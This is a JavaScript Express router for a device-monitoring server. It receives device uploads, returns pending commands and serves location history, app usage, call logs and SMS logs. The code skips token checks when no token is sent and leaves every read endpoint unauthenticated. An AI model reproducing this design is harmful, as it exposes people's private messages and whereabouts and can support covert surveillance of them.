const express = require('express');

module.exports = ({ queries, saveDeviceData, broadcastToDashboards }) => {
    const router = express.Router();

    // HTTP data upload (fallback when WebSocket unavailable)
    router.post('/device/:id/data', (req, res) => {
        try {
            const device = queries.getDevice.get(req.params.id);
            if (!device) return res.status(404).json({ error: 'Device not found' });
            const token = req.headers['x-device-token'];
            if (token && device.token !== token) return res.status(401).json({ error: 'Invalid token' });

            saveDeviceData(req.params.id, req.body);
            const state = queries.getState.get(req.params.id);
            broadcastToDashboards({ type: 'device_update', device_id: req.params.id, state });

            // Return any pending commands piggy-backed on data response
            const pending = queries.getPendingCommands.all(req.params.id);
            res.json({ success: true, pending_commands: pending });
        } catch (e) {
            console.error('[API] Data error:', e.message);
            res.status(500).json({ error: e.message });
        }
    });

    // Get device state
    router.get('/device/:id/state', (req, res) => {
        const state = queries.getState.get(req.params.id);
        res.json(state || {});
    });

    // Get location history
    router.get('/device/:id/locations', (req, res) => {
        const limit = parseInt(req.query.limit) || 100;
        res.json(queries.getLocations.all(req.params.id, limit));
    });

    // Get last location
    router.get('/device/:id/location', (req, res) => {
        res.json(queries.getLastLocation.get(req.params.id) || {});
    });

    // Get app usage
    router.get('/device/:id/appusage', (req, res) => {
        const limit = parseInt(req.query.limit) || 200;
        res.json(queries.getAppUsage.all(req.params.id, limit));
    });

    // Get top apps (last 24h)
    router.get('/device/:id/topapps', (req, res) => {
        const since = Math.floor(Date.now() / 1000) - 86400;
        res.json(queries.getTopApps.all(req.params.id, since));
    });

    // Get call logs
    router.get('/device/:id/calllogs', (req, res) => {
        const limit = parseInt(req.query.limit) || 100;
        res.json(queries.getCallLogs.all(req.params.id, limit));
    });

    // Get SMS logs
    router.get('/device/:id/smslogs', (req, res) => {
        const limit = parseInt(req.query.limit) || 100;
        res.json(queries.getSmsLogs.all(req.params.id, limit));
    });

    // Get live feed
    router.get('/device/:id/feed', (req, res) => {
        const limit = parseInt(req.query.limit) || 50;
        res.json(queries.getFeed.all(req.params.id, limit));
    });

    return router;
};
